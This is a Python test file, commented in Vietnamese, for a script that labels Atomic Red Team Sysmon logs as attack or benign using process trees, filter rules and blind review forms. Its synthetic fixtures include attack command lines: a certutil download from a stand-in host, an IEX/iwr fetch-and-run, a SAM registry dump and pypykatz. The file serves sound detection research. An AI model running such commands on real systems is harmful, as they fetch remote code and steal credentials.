"""Nhãn attack_data theo giao thức `docs/METHODOLOGY.md`: gốc R1–R3, cây tiến trình, lọc F1/F2/F3, nhãn sự kiện L1, nền L2,
phiếu kiểm mù và chấm — trên dữ liệu tổng hợp."""
import datetime as dt
import importlib.util
import json
import sys

import duckdb
import pytest
import yaml

from cti_hunt import config

SYS = "microsoft-windows-sysmon/operational"


@pytest.fixture
def m(monkeypatch):
    monkeypatch.syspath_prepend(str(config.ROOT / "scripts"))
    spec = importlib.util.spec_from_file_location("nhan_attack_data_test", config.ROOT / "scripts/nhan_attack_data.py")
    mod = importlib.util.module_from_spec(spec)
    monkeypatch.setitem(sys.modules, "nhan_attack_data_test", mod)
    spec.loader.exec_module(mod)
    return mod


def test_f3_chi_nhan_lenh_kiem_dieu_kien(m):
    assert m.la_f3('"powershell.exe" & {if (Test-Path C:\\AtomicRedTeam\\x.exe) {exit 0} else {exit 1}}')
    assert m.la_f3("powershell & {if(python --version) {exit 0} else {exit 1}}")
    assert not m.la_f3('"powershell.exe" & {C:\\AtomicRedTeam\\atomics\\T1003\\bin\\x.exe -run}')
    assert not m.la_f3("cmd /c if exist c:\\x echo 1")


def test_f2_agent_splunk(m):
    assert m.la_f2("C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe", "splunkd service")
    assert m.la_f2("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c btool server list general --no-log")
    assert m.la_f2("C:\\x\\btool.exe", "")
    assert not m.la_f2("C:\\Windows\\System32\\cmd.exe", "cmd /c whoami")


def test_mau_f1_dem_thu_muc_ky_thuat(m):
    rows = [(f"b{i}", "C:\\Windows\\System32\\whoami.exe", "whoami") for i in range(5)] + [("b0", "x.exe", "x 1"), ("b1", "x.exe", "x 22")]
    bo_kt = {f"b{i}": (f"T{i}",) for i in range(5)}
    assert m.mau_f1(rows, bo_kt) == {("whoami.exe", "whoami")}
    assert ("x.exe", "x <n>") not in m.mau_f1(rows, bo_kt)


def _p(pg, img, pimg, cmd, pcmd=""):
    return {"pg": pg, "img": img, "pimg": pimg, "cmd": cmd, "pcmd": pcmd}


def test_cay_winrm_va_ba_buoc_loc(m):
    procs = {
        "g1": _p("g0", "C:\\Windows\\System32\\winrshost.exe", "C:\\Windows\\System32\\svchost.exe", "winrshost.exe -Embedding"),
        "g2": _p("g1", "C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\winrshost.exe", "cmd /c powershell -enc AAA"),
        "g3": _p("g2", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\cmd.exe", "certutil -decode a b"),
        "g5": _p("g2", "C:\\p\\powershell.exe", "C:\\Windows\\System32\\cmd.exe", "powershell & {if (test-path c:\\t) {exit 0} else {exit 1}}"),
        "g6": _p("g5", "C:\\Windows\\System32\\cmd.exe", "C:\\p\\powershell.exe", "cmd /c pypykatz -h"),
        "g7": _p("g2", "C:\\x\\btool.exe", "C:\\Windows\\System32\\cmd.exe", "btool server list --no-log"),
        "g8": _p("gx", "C:\\Windows\\notepad.exe", "C:\\Windows\\explorer.exe", "notepad"),
    }
    f1 = {("winrshost.exe", "winrshost.exe -embedding"), ("cmd.exe", "cmd /c powershell -enc aaa")}
    goc, kq = m.gan_mot(procs, f1)
    assert goc == {"g1": ["R1"]}
    assert {g for g, k in kq.items() if k["tan_cong"]} == {"g3"}
    assert {g: k["ly_do_loc"] for g, k in kq.items() if k["trong_cay"] and not k["tan_cong"]} == {
        "g1": "F1", "g2": "F1", "g5": "F3", "g6": "F3", "g7": "F2"}
    assert not kq["g8"]["trong_cay"]


def test_goc_atomic_r2_r3(m):
    procs = {
        "a1": _p("p0", "C:\\p\\powershell.exe", "C:\\Windows\\explorer.exe", "powershell Invoke-AtomicTest T1003"),
        "a2": _p("a1", "C:\\Windows\\System32\\reg.exe", "C:\\p\\powershell.exe", "reg save hklm\\sam x"),
        "b1": _p("q0", "C:\\Windows\\System32\\cmd.exe", "C:\\p\\powershell.exe", "cmd /c hostname", "powershell -c c:\\AtomicRedTeam\\x"),
        "b2": _p("q0", "C:\\Windows\\System32\\whoami.exe", "C:\\p\\powershell.exe", "whoami /all"),
        "c1": _p("z0", "C:\\Windows\\System32\\calc.exe", "C:\\Windows\\explorer.exe", "calc"),
    }
    goc, kq = m.gan_mot(procs, set())
    assert goc == {"a1": ["R2"], "q0": ["R3"]}
    assert {g for g, k in kq.items() if k["tan_cong"]} == {"a1", "a2", "b1", "b2"}


def _viet_bo(base, ten_bo, rows):
    d = base / ten_bo
    d.mkdir(parents=True)
    con = duckdb.connect()
    con.execute("""CREATE TABLE t (ev_host VARCHAR, ev_channel VARCHAR, ev_eid INTEGER, ev_rec BIGINT, ev_ts TIMESTAMP,
                   ProcessGuid VARCHAR, ParentProcessGuid VARCHAR, Image VARCHAR, ParentImage VARCHAR, CommandLine VARCHAR,
                   ParentCommandLine VARCHAR, SourceProcessGUID VARCHAR, NewProcessName VARCHAR, TargetFilename VARCHAR)""")
    # SourceProcessGUID viết hoa như log thật của Sysmon 10 (18/10: phiếu từng tra sai kiểu chữ, mất chuỗi tiến trình).
    con.executemany("INSERT INTO t VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", rows)
    con.execute(f"COPY t TO '{(d / 'events.parquet').as_posix()}' (FORMAT PARQUET)")


T0 = dt.datetime(2024, 1, 1, 10, 0, 0)


def _ev(rec, eid, g, pg="", img="", pimg="", cmd="", pcmd="", src="", ch=SYS, host="H1", sec=0, new=None, tf=None):
    return (host, ch, eid, rec, T0 + dt.timedelta(seconds=sec), g, pg, img, pimg, cmd, pcmd, src, new, tf)


@pytest.fixture
def bo_log(tmp_path):
    base = tmp_path / "parquet"
    whoami = "C:\\Windows\\System32\\whoami.exe"
    # Bộ A (T1105): cây WinRM; certutil là tấn công, có sự kiện 11 và 10 của nó; lệnh kiểm điều kiện, btool, whoami bị lọc.
    a = [_ev(1, 1, "{G1}", "{G0}", "C:\\w\\winrshost.exe", "C:\\w\\svchost.exe", "winrshost.exe -Embedding", sec=1),
         _ev(2, 1, "{G2}", "{G1}", "C:\\w\\cmd.exe", "C:\\w\\winrshost.exe", "cmd /c run", sec=2),
         _ev(3, 1, "{G3}", "{G2}", "C:\\w\\certutil.exe", "C:\\w\\cmd.exe", "certutil -urlcache -f http://x/a a.exe", sec=3),
         _ev(4, 11, "{G3}", img="C:\\w\\certutil.exe", sec=4, tf="C:\\a.exe"),
         _ev(5, 10, "", src="{G3}", sec=5),
         _ev(6, 1, "{G5}", "{G2}", "C:\\w\\powershell.exe", "C:\\w\\cmd.exe", "powershell & {if (test-path c:\\t) {exit 0} else {exit 1}}", sec=6),
         _ev(7, 1, "{G7}", "{G2}", "C:\\s\\SplunkUniversalForwarder\\bin\\splunkd.exe", "C:\\w\\cmd.exe", "splunkd btool x", sec=7),
         _ev(8, 1, "{G8}", "{G2}", whoami, "C:\\w\\cmd.exe", "whoami", sec=8),
         _ev(9, 13, "{N1}", img="C:\\w\\svchost.exe", sec=9),
         _ev(10, 1, "{N2}", "{N0}", "C:\\w\\notepad.exe", "C:\\w\\explorer.exe", "notepad", sec=10),
         _ev(1, 4688, None, ch="security", new="C:\\w\\certutil.exe", cmd="certutil -urlcache -f http://x/a a.exe", sec=3)]
    _viet_bo(base, "ad.T1105.atomic_red_team.windows-sysmon", a)
    meta = {"datasets/attack_techniques/T1105/atomic_red_team/windows-sysmon.log":
            {"ma_bo": "ad.T1105.atomic_red_team.windows-sysmon", "ky_thuat": ["T1105"], "trang_thai": "ok"}}
    # Bốn bộ khác chỉ có whoami (để whoami thành mẫu dùng chung ở 5 thư mục) và một sự kiện Security 4688 whoami.
    for i in range(4):
        b = f"ad.T100{i}.x.windows-sysmon"
        _viet_bo(base, b, [_ev(1, 1, f"{{W{i}}}", "{P}", whoami, "C:\\w\\explorer.exe", "whoami", sec=1),
                           _ev(1, 4688, None, ch="security", new=whoami, cmd="whoami", sec=2)])
        meta[f"datasets/attack_techniques/T100{i}/x/windows-sysmon.log"] = {"ma_bo": b, "ky_thuat": [f"T100{i}"], "trang_thai": "ok"}
    (base / "tom_tat_nap.json").write_text(json.dumps(meta), encoding="utf-8")
    return base


def test_gan_nhan_L1_L2_va_tep_chot(m, bo_log, tmp_path):
    out = tmp_path / "nhan"
    meta = m.gan(bo_log, out)
    l1 = duckdb.connect().execute(f"SELECT bo, ev_rec FROM read_parquet('{(out / 'nhan_tan_cong_L1.parquet').as_posix()}')").fetchall()
    # certutil (3, 4, 5) là tấn công. winrshost (1) và cmd (2) cũng vậy: trong cây, chưa là mẫu dùng chung ở >= 5 thư mục
    # trong dữ liệu tổng hợp này (giao thức §3 tính cả chính gốc). Trên log thật `winrshost.exe -embedding` có ở 46 thư mục.
    assert sorted(r[1] for r in l1) == [1, 2, 3, 4, 5]
    assert {r[0] for r in l1} == {"ad.T1105.atomic_red_team.windows-sysmon"}
    l2 = duckdb.connect().execute(f"SELECT bo, ev_channel, ev_rec FROM read_parquet('{(out / 'nen_pho_bien_L2.parquet').as_posix()}')").fetchall()
    a = "ad.T1105.atomic_red_team.windows-sysmon"
    assert (a, SYS, 7) in l2 and (a, SYS, 8) in l2                   # agent Splunk (F2), whoami dùng chung (F1)
    assert (a, SYS, 3) not in l2 and (a, SYS, 9) not in l2           # tấn công; sự kiện không nối được về tiến trình
    assert sum(1 for r in l2 if r[1] == "security") == 4              # 4688 whoami ở bốn bộ; 4688 certutil không
    pv = json.loads((out / "pham_vi_L1.json").read_text(encoding="utf-8"))
    assert pv["so_bo"] == 1 and pv["ky_thuat_co_su_kien_tan_cong"] == ["T1105"]
    assert pv["bo"][0]["tien_trinh"] == {"trong_cay": 6, "tan_cong": 3, "loc_F3": 1, "loc_F2": 1, "loc_F1": 1}
    assert meta["so_dem"]["su_kien_tan_cong_L1"] == 5
    chot = (out / "CHOT_TRUOC_KHI_DO.sha256").read_text(encoding="utf-8").splitlines()
    assert len(chot) == 6 and all(m.sha(out / line.split("  ")[1]) == line.split("  ")[0] for line in chot)


def test_phieu_khong_lo_dap_an_va_cham(m, bo_log, tmp_path):
    nhan, out = tmp_path / "nhan", tmp_path / "phieu"
    m.gan(bo_log, nhan)
    r = m.phieu(bo_log, nhan, out)
    form_text = (out / "phieu_kiem_nhan_attack_data.yaml").read_text(encoding="utf-8")
    assert "nhan_script" not in form_text and "ly_do_loc" not in form_text and "F3" not in form_text
    form = yaml.safe_load(form_text)
    key = json.loads((out / "dap_an_khong_mo.json").read_text(encoding="utf-8"))
    assert r["so_muc"] == len(form["su_kien"]) == len(key) > 0
    assert [x["id"] for x in form["su_kien"]] == [f"M{i:02d}" for i in range(1, len(key) + 1)]
    assert {v["nhan_script"] for v in key.values()} == {"tan_cong", "binh_thuong"}
    ev10 = [x for x in form["su_kien"] if x["eid"] == 10]
    assert ev10 and all(x["chuoi_tien_trinh_gay_ra"][0].get("Image") for x in ev10)
    # Người chấm khớp mọi mục trừ mục đầu.
    for i, x in enumerate(form["su_kien"]):
        k = key[x["id"]]["nhan_script"]
        x["quyet_dinh"] = k if i else ("binh_thuong" if k == "tan_cong" else "tan_cong")
    (out / "phieu_kiem_nhan_attack_data.yaml").write_text(yaml.safe_dump(form, allow_unicode=True), encoding="utf-8")
    res = m.cham(out)
    assert res["tren"] == len(key) and res["khop"] == len(key) - 1 and len(res["lech"]) == 1


# ---------- Nhãn phiên bản 2 (`17_…` §5): F1 có tiến trình cha, F4 thao tác của khung Atomic ----------

def _b64(s):
    import base64
    return base64.b64encode(s.encode("utf-16le")).decode()


def test_f4_thao_tac_khung_atomic_tho_va_ma_hoa(m):
    assert m.la_f4("powershell -c IEX (iwr 'https://x/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics")
    assert m.la_f4("powershell.exe -NonInteractive -EncodedCommand " + _b64("Install-AtomicsFolder -Force"))
    assert m.la_f4("powershell -enc " + _b64("Invoke-AtomicTest T1531 -TestNumbers 1 -Cleanup"))
    assert m.la_f4("powershell -e " + _b64("Invoke-AtomicTest T1003 -GetPrereqs"))
    assert not m.la_f4("powershell -enc " + _b64("Invoke-AtomicTest T1531 -TestNumbers 1"))
    assert not m.la_f4("powershell -ExecutionPolicy Unrestricted -c Get-Process")


def test_v2_f4_loc_ca_con_chau_va_f1_co_cha(m):
    procs = {
        "w": _p("s0", "C:\\w\\winrshost.exe", "C:\\w\\svchost.exe", "winrshost.exe -Embedding"),
        "i": _p("w", "C:\\p\\powershell.exe", "C:\\w\\winrshost.exe", "powershell -enc " + _b64("Install-AtomicRedTeam -getAtomics")),
        "c": _p("i", "C:\\n\\csc.exe", "C:\\p\\powershell.exe", "csc.exe /noconfig @x.cmdline"),
        "d": _p("w", "C:\\w\\diskshadow.exe", "C:\\w\\winrshost.exe", "diskshadow -s c:\\atomicredteam\\t.txt"),
        "k": _p("d", "C:\\w\\calc.exe", "C:\\w\\diskshadow.exe", "calc"),
        "o": _p("w", "C:\\w\\whoami.exe", "C:\\w\\winrshost.exe", "whoami"),
    }
    f1_v1 = {("winrshost.exe", "winrshost.exe -embedding"), ("calc.exe", "calc"), ("whoami.exe", "whoami")}
    _, v1 = m.gan_mot(procs, f1_v1)
    assert {g for g, k in v1.items() if k["tan_cong"]} == {"i", "c", "d"}     # v1: csc của bước cài đặt là tấn công, calc bị lọc
    f1_v2 = {("svchost.exe", "winrshost.exe", "winrshost.exe -embedding"), ("winrshost.exe", "whoami.exe", "whoami"),
             ("explorer.exe", "calc.exe", "calc")}
    _, v2 = m.gan_mot(procs, f1_v2, phien_ban=2)
    assert {g for g, k in v2.items() if k["tan_cong"]} == {"d", "k"}
    assert v2["i"]["ly_do_loc"] == v2["c"]["ly_do_loc"] == "F4" and v2["o"]["ly_do_loc"] == "F1"


def test_mau_f1_v2_theo_cha(m):
    rows = [(f"b{i}", "C:\\w\\whoami.exe", "whoami", "C:\\p\\powershell.exe") for i in range(5)]
    rows += [(f"b{i}", "C:\\w\\calc.exe", "calc", f"C:\\w\\cha{i}.exe") for i in range(5)]
    bo_kt = {f"b{i}": (f"T{i}",) for i in range(5)}
    assert m.mau_f1(rows, bo_kt) == {("whoami.exe", "whoami"), ("calc.exe", "calc")}
    assert m.mau_f1(rows, bo_kt, phien_ban=2) == {("powershell.exe", "whoami.exe", "whoami")}


def test_gan_v2_va_v1_mac_dinh_khong_doi(m, bo_log, tmp_path):
    m1, m2 = m.gan(bo_log, tmp_path / "v1"), m.gan(bo_log, tmp_path / "v2", phien_ban=2)
    assert m1["so_dem"]["su_kien_tan_cong_L1"] == 5 and "phien_ban" not in m1["tham_so"]
    assert m2["tham_so"]["phien_ban"] == 2
    l1 = duckdb.connect().execute(
        f"SELECT ev_rec FROM read_parquet('{(tmp_path / 'v2' / 'nhan_tan_cong_L1.parquet').as_posix()}')").fetchall()
    # whoami ở bộ A có cha cmd.exe, bốn bộ kia cha explorer.exe: theo v2 không còn là mẫu dùng chung, nên thành tấn công.
    assert sorted(r[0] for r in l1) == [1, 2, 3, 4, 5, 8]
    l2 = duckdb.connect().execute(
        f"SELECT ev_channel FROM read_parquet('{(tmp_path / 'v2' / 'nen_pho_bien_L2.parquet').as_posix()}')").fetchall()
    assert ("security",) not in l2


def test_cham_theo_bo_nhan_khac_khong_ghi_de(m, bo_log, tmp_path):
    nhan, nhan2, out = tmp_path / "nhan", tmp_path / "nhan_v2", tmp_path / "phieu"
    m.gan(bo_log, nhan)
    m.gan(bo_log, nhan2, phien_ban=2)
    m.phieu(bo_log, nhan, out)
    form = yaml.safe_load((out / "phieu_kiem_nhan_attack_data.yaml").read_text(encoding="utf-8"))
    key = json.loads((out / "dap_an_khong_mo.json").read_text(encoding="utf-8"))
    for x in form["su_kien"]:
        x["quyet_dinh"] = key[x["id"]]["nhan_script"]
    (out / "phieu_kiem_nhan_attack_data.yaml").write_text(yaml.safe_dump(form, allow_unicode=True), encoding="utf-8")
    goc = m.cham(out)
    moi = m.cham(out, nhan2)
    assert goc["khop"] == goc["tren"] and (out / "ket_qua_cham.json").exists()
    assert (out / "ket_qua_cham_theo_nhan_v2.json").exists() and moi["dap_an_theo"].startswith("nhãn ở")
    assert all(d["nhom"].startswith("doi_tu_") for d in moi["lech"])
    assert json.loads((out / "dap_an_khong_mo.json").read_text(encoding="utf-8")) == key


# ---------- Phiếu kiểm mù đợt 2 (`18_…`) ----------

@pytest.fixture
def d2(monkeypatch, m):
    monkeypatch.setitem(sys.modules, "nhan_attack_data", m)
    spec = importlib.util.spec_from_file_location("phieu_dot2_test", config.ROOT / "scripts/phieu_kiem_attack_data_dot2.py")
    mod = importlib.util.module_from_spec(spec)
    monkeypatch.setitem(sys.modules, "phieu_dot2_test", mod)
    spec.loader.exec_module(mod)
    return mod


def test_dot2_phan_nhom(d2):
    assert d2.nhom_cua(False, "F1", True, None, True, False) == "C_f1_tra_lai"
    assert d2.nhom_cua(True, None, True, None, True, False) == "A_tan_cong"
    assert d2.nhom_cua(True, None, True, "F4", False, False) == "B_f4_doi"
    assert d2.nhom_cua(False, "F1", True, "F4", False, False) is None          # F4 không đổi so với v1: không thuộc nhóm B
    assert d2.nhom_cua(False, "F3", True, "F3", False, False) == "D_f3"
    assert d2.nhom_cua(False, "F2", True, "F2", False, False) == "E_f2"
    assert d2.nhom_cua(False, "F1", True, "F1", False, False) == "F_f1_v2"
    assert d2.nhom_cua(None, None, None, None, None, True) == "G_ngoai_cay"
    assert d2.nhom_cua(None, None, False, None, False, False) is None


def test_dot2_tao_phieu_va_cham(m, d2, bo_log, tmp_path):
    v1, v2, dot1, out = tmp_path / "v1", tmp_path / "v2", tmp_path / "dot1", tmp_path / "dot2"
    m.gan(bo_log, v1)
    m.gan(bo_log, v2, phien_ban=2)
    dot1.mkdir()
    a = "ad.T1105.atomic_red_team.windows-sysmon"
    (dot1 / "dap_an_khong_mo.json").write_text(json.dumps({"M01": {"khoa": [a, "H1", SYS, 6]}}), encoding="utf-8")
    ds = tmp_path / "danh_sach.json"
    ds.write_text(json.dumps({"tep": [{"duong_dan": "datasets/attack_techniques/T1105/atomic_red_team/windows-sysmon.log",
                                        "mo_ta": "Mô tả thử của bộ T1105"}]}), encoding="utf-8")
    r = d2.tao(bo_log, v1, v2, dot1, out, ds)
    text = (out / "phieu_kiem_nhan_attack_data.yaml").read_text(encoding="utf-8")
    form, key = yaml.safe_load(text), json.loads((out / "dap_an_khong_mo.json").read_text(encoding="utf-8"))
    assert r["so_muc"] == len(form["su_kien"]) == len(key) > 0
    assert not any(n in text for n, _, _ in d2.NHOM) and "nhan_script" not in text
    assert [a, "H1", SYS, 6] not in [v["khoa"] for v in key.values()]                 # sự kiện đã có ở đợt 1 bị loại
    assert all("con_cua_tien_trinh" in x for x in form["su_kien"])
    assert all(x["mo_ta_bo"] == "Mô tả thử của bộ T1105" for x in form["su_kien"] if x["bo_log"] == a)
    cmd = [x for x in form["su_kien"] if x["eid"] == 1 and x["truong"].get("CommandLine") == "cmd /c run"]
    assert cmd and cmd[0]["con_cua_tien_trinh"]["tong_so_con"] == 4                   # certutil, kiểm điều kiện, splunkd, whoami
    assert {v["nhan_script"] for v in key.values()} <= {"tan_cong", "binh_thuong"}
    assert all(v["nhan_script"] == dict((n, nh) for n, _, nh in d2.NHOM)[v["nhom"]] for v in key.values())
    for x in form["su_kien"]:
        x["quyet_dinh"] = key[x["id"]]["nhan_script"]
    (out / "phieu_kiem_nhan_attack_data.yaml").write_text(yaml.safe_dump(form, allow_unicode=True), encoding="utf-8")
    res = m.cham(out)
    assert res["khop"] == res["tren"] == len(key) and set(res["theo_nhom"]) <= {n for n, _, _ in d2.NHOM}


# ---------- Nhãn phiên bản 3 (`20_…` §2): F5 biên dịch Add-Type mang nhãn cha, điều kiện phạm vi ----------

CSC = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
CVT = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe"
ADD = '"csc.exe" /noconfig /fullpaths @"C:\\Users\\a\\AppData\\Local\\Temp\\x1\\x1.cmdline"'


def test_v3_f5_bien_dich_mang_nhan_cha(m):
    procs = {
        "w": _p("s0", "C:\\w\\winrshost.exe", "C:\\w\\svchost.exe", "winrshost.exe -Embedding"),
        "h": _p("w", "C:\\p\\powershell.exe", "C:\\w\\winrshost.exe", "powershell -enc AAAA"),
        "c1": _p("h", CSC, "C:\\p\\powershell.exe", ADD),
        "r1": _p("c1", CVT, CSC, "cvtres.exe /NOLOGO /OUT:x.tmp"),
        "a": _p("w", "C:\\p\\powershell.exe", "C:\\w\\winrshost.exe", "powershell -c Add-Type -TypeDefinition $t; [X]::Run()"),
        "c2": _p("a", CSC, "C:\\p\\powershell.exe", ADD),
        "r2": _p("c2", CVT, CSC, "cvtres.exe /NOLOGO /OUT:y.tmp"),
        "e": _p("w", CSC, "C:\\w\\winrshost.exe", "csc.exe /target:exe /out:payload.exe payload.cs"),
    }
    f1 = {("svchost.exe", "winrshost.exe", "winrshost.exe -embedding"), ("winrshost.exe", "powershell.exe", "powershell -enc aaaa")}
    _, v2 = m.gan_mot(procs, f1, phien_ban=2)
    assert {g for g, k in v2.items() if k["tan_cong"]} == {"c1", "r1", "a", "c2", "r2", "e"}
    _, v3 = m.gan_mot(procs, f1, phien_ban=3)
    assert {g for g, k in v3.items() if k["tan_cong"]} == {"a", "c2", "r2", "e"}   # csc không phải Add-Type (e) không đổi
    assert v3["c1"]["ly_do_loc"] == v3["r1"]["ly_do_loc"] == "F5" and v3["h"]["ly_do_loc"] == "F1"


@pytest.fixture
def bo_v3(tmp_path):
    """Năm bộ chỉ có bộ máy WinRM (mẫu dùng chung ở 5 thư mục); bộ T1100 thêm csc/cvtres của Add-Type dưới PowerShell bộ máy."""
    base, meta = tmp_path / "parquet_v3", {}
    for i in range(5):
        b = f"ad.T110{i}.x.windows-sysmon"
        rows = [_ev(1, 1, "{W}", "{S}", "C:\\w\\winrshost.exe", "C:\\w\\svchost.exe", "winrshost.exe -Embedding", sec=1),
                _ev(2, 1, "{H}", "{W}", "C:\\p\\powershell.exe", "C:\\w\\winrshost.exe", "powershell -enc AAAA", sec=2)]
        if i == 0:
            rows += [_ev(3, 1, "{C}", "{H}", CSC, "C:\\p\\powershell.exe", ADD, sec=3),
                     _ev(4, 1, "{R}", "{C}", CVT, CSC, "cvtres.exe /NOLOGO", sec=4),
                     _ev(5, 11, "{C}", img=CSC, sec=5, tf="C:\\x1.dll")]
        _viet_bo(base, b, rows)
        meta[f"datasets/attack_techniques/T110{i}/x/windows-sysmon.log"] = {"ma_bo": b, "ky_thuat": [f"T110{i}"], "trang_thai": "ok"}
    (base / "tom_tat_nap.json").write_text(json.dumps(meta), encoding="utf-8")
    return base


def test_v3_bo_chi_con_bo_may_ra_khoi_pham_vi(m, bo_v3, tmp_path):
    base = bo_v3
    m2, m3 = m.gan(base, tmp_path / "v2", phien_ban=2), m.gan(base, tmp_path / "v3", phien_ban=3)
    assert m2["so_dem"]["su_kien_tan_cong_L1"] == 3 and m2["so_dem"]["bo_pham_vi_L1"] == 5     # v2: csc, cvtres, tệp của csc
    assert m3["so_dem"]["su_kien_tan_cong_L1"] == 0 and m3["so_dem"]["bo_pham_vi_L1"] == 0
    # Số đếm của tom_tat chỉ tính trong phạm vi L1; số lọc của bộ ra khỏi phạm vi nằm ở pham_vi_L1.json.
    assert m3["so_dem"]["bo_ra_khoi_pham_vi"] == 5 and m3["so_dem"]["tien_trinh_loc"]["F5"] == 0
    pv = json.loads((tmp_path / "v3" / "pham_vi_L1.json").read_text(encoding="utf-8"))
    assert pv["bo"] == [] and len(pv["bo_ra_khoi_pham_vi"]) == 5 and "bo_ra_khoi_pham_vi" not in m2["so_dem"]
    s0 = [x for x in pv["bo_ra_khoi_pham_vi"] if x["bo"] == "ad.T1100.x.windows-sysmon"][0]
    assert s0["tien_trinh"] == {"loc_F1": 2, "loc_F5": 2, "trong_cay": 4}
    tt = duckdb.connect().execute(
        f"SELECT count(*) FROM read_parquet('{(tmp_path / 'v3' / 'tien_trinh_L1.parquet').as_posix()}')").fetchone()[0]
    assert tt == 12                                                     # vẫn giữ tiến trình của bộ ra khỏi phạm vi để tra lại


# ---------- Phiếu kiểm mù đợt 3 (`20_…` §3) ----------

@pytest.fixture
def d3(monkeypatch, m, d2):
    monkeypatch.setitem(sys.modules, "phieu_kiem_attack_data_dot2", d2)
    spec = importlib.util.spec_from_file_location("phieu_dot3_test", config.ROOT / "scripts/phieu_kiem_attack_data_dot3.py")
    mod = importlib.util.module_from_spec(spec)
    monkeypatch.setitem(sys.modules, "phieu_dot3_test", mod)
    spec.loader.exec_module(mod)
    return mod


def test_dot3_phan_nhom(d3):
    assert d3.nhom_cua(True, True, True, "F5", False, False, True, set()) == "J_ngoai_pham_vi"   # bộ ra khỏi phạm vi xét trước
    assert d3.nhom_cua(True, True, True, "F5", False, True, False, {"R1"}) == "H_bien_dich_loc"
    assert d3.nhom_cua(True, True, True, "F1", False, True, False, {"R1"}) is None              # lọc vì lý do khác, không phải F5
    assert d3.nhom_cua(True, True, True, None, True, True, False, {"R2"}) == "I_bien_dich_giu"
    assert d3.nhom_cua(False, True, True, None, True, True, False, {"R1"}) == "K_winrm_tan_cong"
    assert d3.nhom_cua(False, True, True, None, True, True, False, {"R1", "R3"}) == "L_tan_cong_khac"
    assert d3.nhom_cua(False, False, False, None, False, True, False, {"R1"}) is None
    assert d3.nhom_cua(False, False, False, None, False, False, True, set()) is None             # ngoài cây ở bộ ra khỏi phạm vi


def test_dot3_tao_phieu(m, d3, bo_v3, tmp_path):
    v2, v3, cu, out = tmp_path / "v2", tmp_path / "v3", tmp_path / "cu", tmp_path / "dot3"
    m.gan(bo_v3, v2, phien_ban=2)
    m.gan(bo_v3, v3, phien_ban=3)
    cu.mkdir()
    (cu / "dap_an_khong_mo.json").write_text(json.dumps({"N01": {"khoa": ["ad.T1101.x.windows-sysmon", "H1", SYS, 1]}}),
                                             encoding="utf-8")
    ds = tmp_path / "ds.json"
    ds.write_text(json.dumps({"tep": []}), encoding="utf-8")
    r = d3.tao(bo_v3, v2, v3, [cu], out, ds)
    key = json.loads((out / "dap_an_khong_mo.json").read_text(encoding="utf-8"))
    text = (out / "phieu_kiem_nhan_attack_data.yaml").read_text(encoding="utf-8")
    assert r["so_muc"] == len(key) == 4 and set(r["theo_nhom"]) == {"J_ngoai_pham_vi"}            # mọi bộ đều ra khỏi phạm vi
    assert ["ad.T1101.x.windows-sysmon", "H1", SYS, 1] not in [v["khoa"] for v in key.values()]
    assert all(v["nhan_script"] == "binh_thuong" for v in key.values()) and "J_ngoai" not in text
    assert sorted(yaml.safe_load(text)["su_kien"][i]["id"] for i in range(4)) == ["O01", "O02", "O03", "O04"]


# ---------- Nhãn phiên bản 4 (`21_…` §6): F6 lệnh Ansible, chỉ lọc chính tiến trình ----------

def test_v4_f6_lenh_ansible_chi_loc_chinh_no(m):
    chep = "cmd.exe /C PowerShell -NoProfile -EncodedCommand " + _b64("begin { $path = 'C:\\T\\ansible-tmp-17\\source' }")
    bao = "powershell -NoProfile -EncodedCommand " + _b64("$exec_wrapper_str = $input | Out-String")
    procs = {
        "w": _p("s0", "C:\\w\\winrshost.exe", "C:\\w\\svchost.exe", "winrshost.exe -Embedding"),
        "c": _p("w", "C:\\w\\cmd.exe", "C:\\w\\winrshost.exe", chep),
        "x": _p("w", "C:\\p\\powershell.exe", "C:\\w\\winrshost.exe", bao),
        "t": _p("x", "C:\\w\\cmd.exe", "C:\\p\\powershell.exe", 'cmd /c "reg query hklm\\system"'),
        "k": _p("x", CSC, "C:\\p\\powershell.exe", ADD),
        "r": _p("k", CVT, CSC, "cvtres.exe /NOLOGO"),
    }
    f1 = {("svchost.exe", "winrshost.exe", "winrshost.exe -embedding")}
    _, v3 = m.gan_mot(procs, f1, phien_ban=3)
    assert {g for g, k in v3.items() if k["tan_cong"]} == {"c", "x", "t", "k", "r"}
    _, v4 = m.gan_mot(procs, f1, phien_ban=4)
    assert {g for g, k in v4.items() if k["tan_cong"]} == {"t"}                      # lệnh thử dưới Ansible vẫn là tấn công
    assert v4["c"]["ly_do_loc"] == v4["x"]["ly_do_loc"] == "F6"
    assert v4["k"]["ly_do_loc"] == v4["r"]["ly_do_loc"] == "F5"                      # biên dịch của PowerShell Ansible lọc theo cha
    assert not m.la_f6("powershell -c Get-Process") and m.la_f6(chep)
